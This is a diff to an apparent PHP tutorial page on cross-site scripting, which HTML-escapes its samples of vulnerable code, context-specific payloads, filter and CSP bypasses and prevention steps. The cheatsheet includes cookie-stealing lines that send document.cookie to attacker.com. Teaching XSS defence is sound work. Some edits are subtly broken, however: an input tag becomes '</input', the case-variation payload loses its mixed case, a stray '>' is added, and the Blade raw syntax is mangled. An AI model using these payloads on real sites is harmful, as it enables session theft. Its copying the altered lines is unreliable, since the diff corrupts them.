@@ -68,9 +68,9 @@
             <pre><code>// VULNERABLE
 echo "Search results for: " . $_GET['q'];
 
-// Payload: ?q=<script>alert(document.cookie)</script>
-// Payload: ?q=<img src=x onerror=alert(1)>
-// Payload: ?q=<svg onload=alert(1)></code></pre>
+// Payload: ?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+// Payload: ?q=&lt;img src=x onerror=alert(1)&gt;
+// Payload: ?q=&lt;svg onload=alert(1)&gt;</code></pre>
 
             <h3>Stored XSS</h3>
             <pre><code>// VULNERABLE — comment stored in DB then displayed without encoding
@@ -83,25 +83,25 @@ echo $row['text'];  // stored XSS payload executes for every visitor</code></pre
             <h3>Context-Aware Injection</h3>
             <p>The injection context determines what payload works. Different HTML contexts require different payloads:</p>
             <pre><code>// Context 1: HTML body — standard tag injection
-echo "<p>" . $input . "</p>";
-// Payload: <script>alert(1)</script>
+echo "&lt;p&gt;" . $input . "&lt;/p&gt;";
+// Payload: &lt;script&gt;alert(1)&lt;/script&gt;
 
 // Context 2: HTML attribute
-echo '<input value="' . $input . '">';
-// Payload: "><script>alert(1)</script>
+echo '&lt;input value="' . $input . '"&gt;';
+// Payload: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 // Payload: " onmouseover="alert(1)
 
 // Context 3: JavaScript string
-echo "<script>var x = '" . $input . "';</script>";
+echo "&lt;script&gt;var x = '" . $input . "';&lt;/script&gt;";
 // Payload: '; alert(1); //
 // Payload: \'; alert(1); //
 
 // Context 4: href attribute
-echo '<a href="' . $input . '">click</a>';
+echo '&lt;a href="' . $input . '"&gt;click&lt;/a&gt;';
 // Payload: javascript:alert(1)
 
 // Context 5: Inside style tag
-echo '<style>body { background: ' . $input . '; }</style>';
+echo '&lt;style&gt;body { background: ' . $input . '; }&lt;/style&gt;';
 // Payload: red; } body { background: url(javascript:alert(1))</code></pre>
 
             <h3>Bypassing htmlspecialchars()</h3>
@@ -110,14 +110,14 @@ echo '<style>body { background: ' . $input . '; }</style>';
 echo htmlspecialchars($input);   // default flags
 
 // In single-quoted attribute — still injectable!
-echo "<input value='" . htmlspecialchars($input) . "'>";
+echo "&lt;/input value='" . htmlspecialchars($input) . "'&gt;";
 // Payload: ' onmouseover='alert(1)   — single quote not escaped!
 
 // CORRECT — always use ENT_QUOTES and specify charset
 echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
 
 // CORRECT for attribute context:
-echo '<input value="' . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . '">';</code></pre>
+echo '&lt;input value="' . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . '"&gt;';</code></pre>
 
             <h3>Bypassing filter_var()</h3>
             <pre><code>// filter_var with FILTER_SANITIZE_STRING is deprecated and unreliable
@@ -130,29 +130,29 @@ $url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
 
             <h3>XSS Payload Cheatsheet</h3>
             <pre><code>// Basic
-<script>alert(1)</script>
-<script>alert(document.cookie)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 // Attribute injection
-" onmouseover="alert(1)
+" onmouseover="alert(1)&gt;
 " onfocus="alert(1)" autofocus="
 
 // Tag bypass
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<iframe src="javascript:alert(1)">
-<details open ontoggle=alert(1)>
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;details open ontoggle=alert(1)&gt;
 
 // Filter bypass
-<ScRiPt>alert(1)</sCrIpT>          // case variation
-<scr<script>ipt>alert(1)</script>   // nested tag
-<img src=x onerror="&#97;lert(1)">  // HTML entities
-<img src=x onerror="\u0061lert(1)"> // unicode escape
+&lt;script&gt;alert(1)&lt;/script&gt;          // case variation
+&lt;scr&lt;script&gt;ipt>alert(1)&lt;/script&gt;   // nested tag
+&lt;img src=x onerror="&#97;lert(1)"&gt;  // HTML entities
+&lt;img src=x onerror="\u0061lert(1)"&gt; // unicode escape
 
 // Cookie steal
-<script>fetch('https://attacker.com/?c='+document.cookie)</script>
-<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie"></code></pre>
+&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie"&gt;</code></pre>
 
             <h3>Content Security Policy (CSP) Bypass</h3>
             <pre><code>// Weak CSP: script-src 'unsafe-inline' — useless
@@ -160,12 +160,12 @@ $url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
 
 // Bypass via allowed CDN
 // If CSP allows cdn.jsdelivr.net:
-<script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"></script>
-<div ng-app ng-csr-no-unsafe-eval>{{constructor.constructor('alert(1)')()}}</div>
+&lt;script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app ng-csr-no-unsafe-eval&gt;&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;&lt;/div&gt;
 
 // Bypass via base tag injection
 // If base-uri is not restricted:
-<base href="https://attacker.com/">   // redirects all relative script loads</code></pre>
+&lt;base href="https://attacker.com/"&gt;   // redirects all relative script loads</code></pre>
 
             <h3>Prevention</h3>
             <pre><code>// 1. Context-aware output encoding (always)
@@ -182,8 +182,8 @@ session_set_cookie_params(['httponly' => true, 'secure' => true]);
 header("X-XSS-Protection: 1; mode=block");
 
 // 5. Use a template engine with auto-escaping (Twig, Blade)
-{{ $variable }}     // Blade auto-escapes
-{!! $variable !!}   // Blade raw — DANGEROUS, only when necessary</code></pre>
+&#123;&#123; $variable &#125;&#125;     // Blade auto-escapes
+&#123;&#123;!! $variable !!&#125;&#125;   // Blade raw — DANGEROUS, only when necessary</code></pre>
 
             <div class="callout callout-success">
                 <div class="callout-icon">✅</div>
